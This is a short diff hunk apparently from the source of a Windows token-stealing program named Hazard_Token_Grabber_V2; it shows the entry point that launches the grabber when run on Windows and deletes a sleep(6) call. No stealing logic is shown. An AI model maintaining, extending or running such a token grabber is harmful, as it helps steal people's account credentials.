@@ -534,4 +534,3 @@ class Hazard_Token_Grabber_V2(functions):
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Hazard_Token_Grabber_V2().init())
-    sleep(6)
